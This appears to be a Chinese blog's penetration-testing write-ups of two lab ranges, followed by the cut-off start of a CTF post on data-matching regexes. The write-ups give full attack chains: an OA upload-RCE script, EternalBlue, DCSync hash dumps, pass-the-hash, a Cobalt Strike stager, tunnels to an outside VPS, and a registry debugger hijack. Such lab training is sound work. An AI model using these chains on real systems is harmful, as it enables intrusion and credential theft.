[PORT] 目标:172.22.1.18 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=445 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=389 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=80 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.2 状态:open 详情:port=88 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=139 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=135 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.21 状态:open 详情:port=445 [2025-10-22 23:59:01] [PORT] 目标:172.22.1.18 状态:open 详情:port=3306 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.21 状态:identified 详情:hostname=XIAORANG-WIN7, ipv4=[172.22.1.21], ipv6=[] [2025-10-22 23:59:04] [VULN] 目标:172.22.1.21 状态:vulnerable 详情:port=445, vulnerability=MS17-010, os=Windows Server 2008 R2 Enterprise 7601 Service Pack 1 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:port=445, service=smb, os=Windows Server 2016 Datacenter 14393 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:domain_name=xiaorang.lab, server_service=DC01, port=139, computer_name=DC01.xiaorang.lab, netbios_domain=XIAORANG, netbios_computer=DC01, workstation_service=DC01, domain_controllers=XIAORANG, os_version=Windows Server 2016 Datacenter 14393 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.2 状态:identified 详情:hostname=DC01, ipv4=[172.22.1.2], ipv6=[] [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.18 状态:identified 详情:hostname=XIAORANG-OA01, ipv4=[172.22.1.18], ipv6=[] [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.15 状态:identified 详情:title=Bootstrap Material Admin, Url=http://172.22.1.15, status_code=200, length=5578, server_info=map[content-type:text/html; charset=utf-8 date:Wed, 22 Oct 2025 15:59:04 GMT length:5578 server:Apache/2.4.41 (Ubuntu) status_code:200 title:Bootstrap Material Admin vary:Accept-Encoding], fingerprints=[], port=80, service=http [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.18 状态:identified 详情:workstation_service=XIAORANG-OA01, server_service=XIAORANG-OA01, os_version=Windows Server 2012 R2 Datacenter 9600, port=139, computer_name=XIAORANG-OA01.xiaorang.lab, domain_name=xiaorang.lab, netbios_domain=XIAORANG, netbios_computer=XIAORANG-OA01 [2025-10-22 23:59:04] [SERVICE] 目标:172.22.1.21 状态:identified 详情:netbios_computer=XIAORANG-WIN7, workstation_service=XIAORANG-WIN7, server_service=XIAORANG-WIN7, os_version=Windows Server 2008 R2 Enterprise 7601 Service Pack 1, port=139, computer_name=XIAORANG-WIN7.xiaorang.lab, domain_name=xiaorang.lab, netbios_domain=XIAORANG [2025-10-22 23:59:05] [SERVICE] 目标:172.22.1.18 状态:identified 详情:fingerprints=[], port=80, service=http, title=无标题, Url=http://172.22.1.18, status_code=302, length=0, server_info=map[cache-control:no-store, no-cache, must-revalidate content-length:0 content-type:text/html;charset=utf-8 date:Wed, 22 Oct 2025 15:59:04 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:0 location:?m=login pragma:no-cache redirect_Url:http://172.22.1.18?m=login server:Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID=usae6qvqpcqiqc1jrcdvuubeu6; path=/ status_code:302 title:无标题 x-powered-by:PHP/7.1.9] [2025-10-22 23:59:05] [SERVICE] 目标:172.22.1.18 状态:identified 详情:title=信呼协同办公系统, Url=http://172.22.1.18?m=login, status_code=200, length=4012, server_info=map[cache-control:no-store, no-cache, must-revalidate content-type:text/html;charset=utf-8 date:Wed, 22 Oct 2025 15:59:05 GMT expires:Thu, 19 Nov 1981 08:52:00 GMT length:4012 pragma:no-cache server:Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 set-cookie:PHPSESSID=fv540efek5pjvre6rfkjapbcvo; path=/ status_code:200 title:信呼协同办公系统 x-powered-by:PHP/7.1.9], fingerprints=[], port=80, service=http [2025-10-22 23:59:07] [VULN] 目标:http://172.22.1.15:80 状态:vulnerable 详情:vulnerability_type=poc-yaml-thinkphp5023-method-rce, vulnerability_name=poc1, references=[https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce] 信息收集：\n172.22.1.2：DC域控\r172.22.1.15：thinkphp5.0.23 RCE 已被利用\r172.22.1.18：信呼协同办公系统\r172.22.1.21：XIAORANG-WIN7 存在MS17-010漏洞 先利用 Stowaway 进行内网代理，蚁剑上传 linux_x64_agent，给执行权限，vps先开启服务端：\n./linux_x64_admin -l 2345 -s 114514 172.22.1.15 入口机连接服务端：\n./linux_x64_agent -c vps的ip:2345 -s 114514 vps开放端口3456：\n(admin) \u0026gt;\u0026gt; use 0\r(node 0) \u0026gt;\u0026gt; socks 3456\r[*] Trying to listen on 0.0.0.0:3456......\r[*] Waiting for agent\u0026#39;s response......\r[*] Socks start successfully! 本地浏览器配置 FoxyProxy：\n访问到内网的信呼协同办公系统web服务：\n配置kali上的 /etc/proxychains4.conf：\nsocks5 vps的ip 3456 利用网上已有的脚本，exp.py：\nimport requests session = requests.session() url_pre = \u0026#39;http://172.22.1.18/\u0026#39; url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=11\u0026#39; data1 = { \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; } r = session.post(url1, data=data1) r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r+\u0026#39;)}) filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; id = r.json()[\u0026#39;id\u0026#39;] url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; r = session.get(url3) r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) print(r.text) 搭配 proxychains 利用脚本上传webshell：\n$ proxychains python exp.py [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.18:80 ... OK ������ C �еľ�û�б�ǩ�� �������к��� E0D6-4F4A C:\\phpStudy\\PHPTutorial\\WWW\\upload\\2025-10 ��Ŀ¼ 2025/10/23 11:40 \u0026lt;DIR\u0026gt; . 2025/10/23 11:40 \u0026lt;DIR\u0026gt; .. 2025/10/23 11:33 40 23_11332296.uptemp 2025/10/23 11:40 29 23_11405758.php 2 ���ļ� 69 �� 2 ��Ŀ¼ 22,776,528,896 ������ 蚁剑连配置好代理：\n连上内网的webshell，查看当前用户：\nC:\\phpStudy\\PHPTutorial\\WWW\\upload\\2025-10\u0026gt; whoami\rnt authority\\system C:/Users/Administrator/flag/flag02.txt：\n___ ___ ___ ________ ________ ________ ________ ________ ________ |\\ \\ / /|\\ \\|\\ __ \\|\\ __ \\|\\ __ \\|\\ __ \\|\\ ___ \\|\\ ____\\ \\ \\ \\/ / | \\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\|\\ \\ \\ \\\\ \\ \\ \\ \\___| \\ \\ / / \\ \\ \\ \\ __ \\ \\ \\\\\\ \\ \\ _ _\\ \\ __ \\ \\ \\\\ \\ \\ \\ \\ ___ / \\/ \\ \\ \\ \\ \\ \\ \\ \\ \\\\\\ \\ \\ \\\\ \\\\ \\ \\ \\ \\ \\ \\\\ \\ \\ \\ \\|\\ \\ / /\\ \\ \\ \\__\\ \\__\\ \\__\\ \\_______\\ \\__\\\\ _\\\\ \\__\\ \\__\\ \\__\\\\ \\__\\ \\_______\\\r/__/ /\\ __\\ \\|__|\\|__|\\|__|\\|_______|\\|__|\\|__|\\|__|\\|__|\\|__| \\|__|\\|_______|\r|__|/ \\|__| flag02: 2ce3-4813-87d4-\rAwesome! ! ! You found the second flag, now you can attack the domain controller. proxychains + msfconsole 打永恒之蓝：\n$ proxychains msfconsole msf6 \u0026gt; search ms17-010 msf6 \u0026gt; use exploit/windows/smb/ms17_010_eternalblue msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show payloads msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set payload windows/x64/meterpreter/bind_tcp_uuid msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set RHOSTS 172.22.1.21 msf6 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; exploit 运行成功后出现 meterpreter\u0026gt;，此时已经是SYSTEM 账户，可以通过 DCSync 来导出所有用户的 hash 然后进行哈希传递攻击，要想使用 DCSync 必须获得以下任一用户的权限：\nAdministrators 组内的用户\rDomain Admins 组内的用户\rEnterprise Domain Admins 组内的用户 调用mimikatz模块打 PTH，导出域内所有用户的信息(包括哈希值)：\nload kiwi kiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit [DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain [DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server [DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39; [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) 502 krbtgt fb812eea13a18b7fcdb8e6d67ddc205b 514 1106 Marcus e07510a4284b3c97c8e7dee970918c5c 512 1107 Charles f6a9881cd5ae709abb4ac9ab87f24617 512 1000 DC01$ 5e213d826e0f3abd5da6a60008fc7d17 532480 500 Administrator 10cf89a850fb1cdbe6bb432b859164c8 512 1104 XIAORANG-OA01$ 96772bfc48f72ad75bee0775454111f1 4096 1108 XIAORANG-WIN7$ 71611aa5ef5bb0f273b6bb8c1e88b990 4096 mimikatz(powershell) # exit Bye! proxychains + crackmapexec 来进行横向移动，直接执行获取flag3的命令：\n$ proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.16 [*] First time use detected [*] Creating home directory structure [*] Creating default workspace [*] Initializing FTP protocol database [*] Initializing SSH protocol database [*] Initializing SMB protocol database [*] Initializing RDP protocol database [*] Initializing LDAP protocol database [*] Initializing WINRM protocol database [*] Initializing MSSQL protocol database [*] Copying default configuration file [*] Generating SSL certificate [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:445 ... OK [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:135 ... OK SMB 172.22.1.2 445 DC01 [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True) [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:445 ... OK SMB 172.22.1.2 445 DC01 [+] xiaorang.lab\\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!) [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:135 ... OK [proxychains] Strict chain ... vps的ip:3456 ... 172.22.1.2:49668 ... OK SMB 172.22.1.2 445 DC01 [+] Executed command SMB 172.22.1.2 445 DC01 ___ ___ SMB 172.22.1.2 445 DC01 \\\\ / / / / // | | // ) ) // ) ) // | | /| / / // ) ) SMB 172.22.1.2 445 DC01 \\ / / / //__| | // / / //___/ / //__| | //| / / // SMB 172.22.1.2 445 DC01 / / / / / ___ | // / / / ___ ( / ___ | // | / / // ____ SMB 172.22.1.2 445 DC01 / /\\\\ / / // | | // / / // | | // | | // | / / // / / SMB 172.22.1.2 445 DC01 / / \\\\ __/ /___ // | | ((___/ / // | | // | | // |/ / ((____/ / SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 flag03: e8f88d0d43d6} SMB 172.22.1.2 445 DC01 SMB 172.22.1.2 445 DC01 Unbelievable! ! You found the last flag, which means you have full control over the entire domain network. flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}\n参考资料：\nhttps://fushuling.com/index.php/2023/08/27/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7initial/\nTsclient 靶机ip：39.98.109.218\nnmap：\nnmap 39.98.109.218 -sV -sS --min-rate 10000 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 18:24 HKT Nmap scan report for 39.98.109.218 Host is up (0.0048s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds fscan扫描漏洞：\n./fscan -h 39.98.109.218 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4 start infoscan 39.98.109.218:1433 open 39.98.109.218:80 open [*] alive ports len is: 2 start vulscan [*] WebTitle http://39.98.109.218 code:200 len:703 title:IIS Windows Server [+] mssql 39.98.109.218:1433:sa 1qaz!QAZ 已完成 2/2 [*] 扫描结束,耗时: 10.136861589s 扫出 mssql 服务开放在端口1433上，存在弱口令问题，用户名sa，密码1qaz!QAZ，用MDUT连上：\nwhoami：\nnt service\\mssqlserver ipconfig：\nWindows IP 配置\r以太网适配器 以太网:\r连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::e576:667d:2727:e225%14\rIPv4 地址 . . . . . . . . . . . . : 172.22.8.18\r子网掩码 . . . . . . . . . . . . : 255.255.0.0\r默认网关. . . . . . . . . . . . . : 172.22.255.253\r隧道适配器 isatap.{E309DFD0-37D7-4E89-A23A-3C61210B34EA}:\r媒体状态 . . . . . . . . . . . . : 媒体已断开连接\r连接特定的 DNS 后缀 . . . . . . . : 隧道适配器 Teredo Tunneling Pseudo-Interface:\r连接特定的 DNS 后缀 . . . . . . . : IPv6 地址 . . . . . . . . . . . . : 2001:0:348b:fb58:4ee:26a:d89d:9225\r本地链接 IPv6 地址. . . . . . . . : fe80::4ee:26a:d89d:9225%12\r默认网关. . . . . . . . . . . . . : :: 上传SweetPotato.exe到 C:/Users/Public/ 目录下进行提权：\nC:/Users/Public/SweetPotato.exe -a whoami flag01.txt：\nC:/Users/Public/SweetPotato.exe -a \u0026#34;type C:\\Users\\Administrator\\flag\\flag01.txt\u0026#34; 上传cs stager并用以 nt authority\\system 权限运行：\nC:/Users/Public/SweetPotato.exe -a C:/Users/Public/artifact.exe cs上线：\n查看本地用户账户：\nshell net user 获取当前登录用户和远程登录用户：\nshell quser hashdump导出所有用户哈希：\nhashdump john用户之前看到作为本地用户而且是在线的，查看一下占用了哪些进程：\n进程注入后john上线cs：\n已经知道john在使用远程桌面，查看john的网络连接，可能有网络驱动器映射：\nshell net use 发现共享 TSCLIENT 的C盘，直接读敏感文件：\nshell dir \\\\TSCLIENT\\C\rshell type \\\\TSCLIENT\\C\\credential.txt credential.txt：\nxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有个hint提示 hijack image (映像劫持)\n先上传 fscan.exe 到靶机，用system权限的用户扫一遍内网：\nshell C:\\Users\\Public\\fscan.exe -h 172.22.8.18/24\rstart infoscan\r(icmp) Target 172.22.8.18 is alive\r(icmp) Target 172.22.8.15 is alive\r(icmp) Target 172.22.8.31 is alive\r(icmp) Target 172.22.8.46 is alive\r[*] Icmp alive hosts len is: 4\r172.22.8.15:88 open\r172.22.8.46:445 open\r172.22.8.31:445 open\r172.22.8.18:1433 open\r172.22.8.15:445 open\r172.22.8.18:445 open\r172.22.8.46:139 open\r172.22.8.31:139 open\r172.22.8.15:139 open\r172.22.8.31:135 open\r172.22.8.46:135 open\r172.22.8.15:135 open\r172.22.8.18:139 open\r172.22.8.18:135 open\r172.22.8.46:80 open\r172.22.8.18:80 open\r[*] alive ports len is: 16\rstart vulscan\r[*] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT [*] NetBios 172.22.8.15 [+] DC:XIAORANG\\DC01 [*] NetInfo [*]172.22.8.31\r[-\u0026gt;]WIN19-CLIENT\r[-\u0026gt;]172.22.8.31\r[*] WebTitle http://172.22.8.18 code:200 len:703 title:IIS Windows Server\r[*] NetInfo [*]172.22.8.46\r[-\u0026gt;]WIN2016\r[-\u0026gt;]172.22.8.46\r[*] NetInfo [*]172.22.8.18\r[-\u0026gt;]WIN-WEB\r[-\u0026gt;]172.22.8.18\r[*] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393\r[*] NetInfo [*]172.22.8.15\r[-\u0026gt;]DC01\r[-\u0026gt;]172.22.8.15\r[*] WebTitle http://172.22.8.46 code:200 len:703 title:IIS Windows Server\r[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ 总结一下：\n172.22.8.18 WIN-WEB 目前这台非域机器，已拿下\r172.22.8.15 DC01 域控 172.22.8.31 WIN19-CLIENT 域机器\r172.22.8.46 WIN2016 用stowaway搭建内网代理方便后续渗透，靶机当跳板机，上传 windows_x64_agent.exe，vps上运行控制端 linux_x64_admin 开放2333端口：\n./linux_x64_admin -l 2333 -s 114514 靶机连上vps控制端：\nshell C:\\Users\\Public\\windows_x64_agent.exe -c 121.40.46.63:2333 -s 114514 --reconnect 8 建立3456端口代理：\n再配置一下kali的proxychains，用之前 credential.txt 里的用户密码尝试喷洒：\nproxychains4 crackmapexec smb 172.22.8.0/24 -u \u0026#39;Aldrich\u0026#39; -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; SMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) SMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False) SMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.18:445 ... 172.22.8.101:445 ... OK SMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.102:445 ... 172.22.8.15:445 ... OK [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.15:445 ... OK SMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED [proxychains] Strict chain ... 121.40.46.63:3456 [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.31:445 ... 172.22.8.103:445 ... OK [proxychains] Strict chain ... 121.40.46.63:3456 ... 172.22.8.31:445 ... OK SMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 密码都过期了，利用smbpasswd.py进行密码修改，否则无法利用rdp桌面登录：\ncd /usr/share/doc/python3-impacket/examples/ proxychains4 python3 smbpasswd.py xiaorang.lab/Aldrich:\u0026#39;Ald@rLMWuy7Z!#\u0026#39;@172.22.8.15 -newpass \u0026#39;qwert@12345\u0026#39; 远程桌面登录开个共享文件夹方便后续渗透：\nproxychains4 rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p \u0026#39;qwert@12345\u0026#39; -r disk:share=/home/w8nn9z/Desktop/shared powershell中执行命令来获取访问控制列表(ACL)的信息：\nget-acl -path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl * 发现只要是登录认证成功的用户都有修改注册表的权限，这样就可以给放大镜设置debugger来进行提权，运行放大镜程序magnify.exe会先执行cmd.exe：\nREG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; type C\\Users\\Administrator\\flag\\flag02.txt flag02.txt：\n172.22.8.46 WIN2016这台域机器被拿下，还剩DC01域控和WIN19-CLIENT，先查一下AD域管理员列表：\nnet group \u0026#34;domain admins\u0026#34; /domain 当前机器的用户正好是域管理员，后续通过共享文件夹上传 mimikatz.exe：\nDCSync 获取用户凭证，导出所有用户信息：\nC:\\Users\\Public\\mimikatz.exe\rlsadump::dcsync /domain:xiaorang.lab /all /csv 横向移动到DC域控上：\ncd /usr/share/doc/python3-impacket/examples/ proxychains4 python3 smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15 flag03.txt：\n参考资料：\nhttps://www.s1mh0.cn/blog/index.php/2024/11/30/cqyj_tsclient/\nhttps://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/\n","permalink":"https://blog.w8nn9z.top/posts/pentest/cqyj/","summary":"","title":"春秋云境靶场"},{"content":"身份证 # 身份证号格式，可能会进⾏空格分隔或横线分隔\r794688197610150966\r794688 19761015 0966\r794688-19761015-0966\ridcard_pattern = r\u0026#39;\\d{17}[\\dXx]|\\d{6}-\\d{8}-[\\dXx]{4}|\\d{6} \\d{8} [\\dXx]{4}\u0026#39; 手机号 # ⼿机号格式，可能会进⾏空格分隔或横线分隔，可能会带有“+86 ”或“(+86)”前缀\r19930800372\r199 3080 0372\r199-3080-0372\r+86 19930800372\r+86 199 3080 0372\r+86 199-3080-0372\r(+86)19930800372\r(+86)199 3080 0372\r(+86)199-3080-0372\rphone_pattern = r\u0026#39;(?:\\(\\+86\\)|\\+86)?\\s*(\\d{3}(?:[\\s\\-]\\d{4}[\\s\\-]\\d{4}|\\d{8}))\u0026#39; 银行卡号 银⾏卡号为 16-19 位数字字符串，使⽤ Luhn 算法进⾏校验：\n# 银⾏卡格式，⽆变形\r6228480402564890018\rbankcard_pattern = r\u0026#39;(?\u0026lt;!\\d)\\d{16,19}(?!\\d)\u0026#39; 校验算法：\ndef luhn_check(card_number): \u0026#34;\u0026#34;\u0026#34;Luhn算法校验\u0026#34;\u0026#34;\u0026#34; total = 0 # 从右到左遍历 for i, digit in enumerate(reversed(card_number)): num = int(digit) if i % 2 == 1: # 偶数位（从右往左数，索引从0开始） num *= 2 if num \u0026gt; 9: num = num // 10 + num % 10 # 各位数字相加 total += num return total % 10 == 0 ip地址 ip地址开头之前和结尾之后不再出现数字：\n# IP 地址格式，⽆变形\r192.168.10.1\rip_pattern = r\u0026#39;(?\u0026lt;!\\d)(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?!\\d)\u0026#39; mac地址 mac地址格式比较固定，大小写mac地址：\n# MAC 地址格式，⽆变形\r00:a0:c9:14:c8:29\rmac_pattern = r\u0026#39;[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\u0026#39; 常用脚本 合并xlsx：\nimport os import pandas as pd # 定义文件夹路径和输出文件名 folder_path = \u0026#39;./\u0026#39; # 存放 .xlsx 文件的文件夹路径 output_file = \u0026#39;merged.xlsx\u0026#39; # 合并后的输出文件名 # 创建一个空的 DataFrame 用于存储合并数据 merged_data = pd.DataFrame() # 遍历文件夹中的所有 .xlsx 文件 for file_name in os.listdir(folder_path): if file_name.endswith(\u0026#39;.xlsx\u0026#39;): file_path = os.path.join(folder_path, file_name) # 读取每个 Excel 文件 data = pd.read_excel(file_path) # 将数据追加到合并的 DataFrame 中 merged_data = pd.concat([merged_data, data], ignore_index=True) # 将合并后的数据保存为新的 Excel 文件 merged_data.to_excel(output_file, index=False) print(f\u0026#34;所有文件已成功合并并保存为 {output_file}\u0026#34;) 题目 2025 羊城杯 dataIdSort import re import csv def extract_and_save(filename): # 身份证模式 id_pattern = r\u0026#39;\\d{17}[\\dXx]|\\d{6}-\\d{8}-[\\dXx]{4}|\\d{6} \\d{8} [\\dXx]{4}\u0026#39; id_coefficients = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] id_check_table = {0: \u0026#39;1\u0026#39;, 1: \u0026#39;0\u0026#39;, 2: \u0026#39;X\u0026#39;, 3: \u0026#39;9\u0026#39;, 4: \u0026#39;8\u0026#39;, 5: \u0026#39;7\u0026#39;, 6: \u0026#39;6\u0026#39;, 7: \u0026#39;5\u0026#39;, 8: \u0026#39;4\u0026#39;, 9: \u0026#39;3\u0026#39;, 10: \u0026#39;2\u0026#39;} common_bankcard_prefixes = { \u0026#39;622848\u0026#39;, \u0026#39;622700\u0026#39;, \u0026#39;621700\u0026#39;, \u0026#39;622262\u0026#39;, \u0026#39;622188\u0026#39;, \u0026#39;622200\u0026#39;, \u0026#39;622568\u0026#39;, \u0026#39;622609\u0026#39;, \u0026#39;622908\u0026#39;, \u0026#39;622518\u0026#39; } def is_valid_id(id_str): clean = id_str.replace(\u0026#39;-\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;) if len(clean) != 18: return False try: if clean[:6] in common_bankcard_prefixes: return False total = sum(int(clean[i]) * id_coefficients[i] for i in range(17)) remainder = total % 11 expected = id_check_table[remainder] return expected == clean[17].upper() except: return False phone_pattern = r\u0026#39;(?:\\(\\+86\\)|\\+86)?\\s*(\\d{3}(?:[\\s\\-]\\d{4}[\\s\\-]\\d{4}|\\d{8}))\u0026#39; valid_prefixes = { \u0026#39;134\u0026#39;, \u0026#39;135\u0026#39;, \u0026#39;136\u0026#39;, \u0026#39;137\u0026#39;, \u0026#39;138\u0026#39;, \u0026#39;139\u0026#39;, \u0026#39;147\u0026#39;, \u0026#39;148\u0026#39;, \u0026#39;150\u0026#39;, \u0026#39;151\u0026#39;, \u0026#39;152\u0026#39;, \u0026#39;157\u0026#39;, \u0026#39;158\u0026#39;, \u0026#39;159\u0026#39;, \u0026#39;172\u0026#39;, \u0026#39;178\u0026#39;, \u0026#39;182\u0026#39;, \u0026#39;183\u0026#39;, \u0026#39;184\u0026#39;, \u0026#39;187\u0026#39;, \u0026#39;188\u0026#39;, \u0026#39;195\u0026#39;, \u0026#39;198\u0026#39;, \u0026#39;130\u0026#39;, \u0026#39;131\u0026#39;, \u0026#39;132\u0026#39;, \u0026#39;140\u0026#39;, \u0026#39;145\u0026#39;, \u0026#39;146\u0026#39;, \u0026#39;155\u0026#39;, \u0026#39;156\u0026#39;, \u0026#39;166\u0026#39;, \u0026#39;167\u0026#39;, \u0026#39;171\u0026#39;, \u0026#39;175\u0026#39;, \u0026#39;176\u0026#39;, \u0026#39;185\u0026#39;, \u0026#39;186\u0026#39;, \u0026#39;196\u0026#39;, \u0026#39;133\u0026#39;, \u0026#39;149\u0026#39;, \u0026#39;153\u0026#39;, \u0026#39;173\u0026#39;, \u0026#39;174\u0026#39;, \u0026#39;177\u0026#39;, \u0026#39;180\u0026#39;, \u0026#39;181\u0026#39;, \u0026#39;189\u0026#39;, \u0026#39;190\u0026#39;, \u0026#39;191\u0026#39;, \u0026#39;193\u0026#39;, \u0026#39;199\u0026#39; } def is_valid_phone(phone_str): clean = re.sub(r\u0026#39;[^\\d]\u0026#39;, \u0026#39;\u0026#39;, phone_str) if len(clean) != 11 and len(clean) != 13: return False if len(clean) == 11: return clean[:3] in valid_prefixes if len(clean) == 13: return clean[2:5] in valid_prefixes # 银行卡号模式 bankcard_pattern = r\u0026#39;(?\u0026lt;!\\d)\\d{16,19}(?!\\d)\u0026#39; common_bankcard_prefixes = { 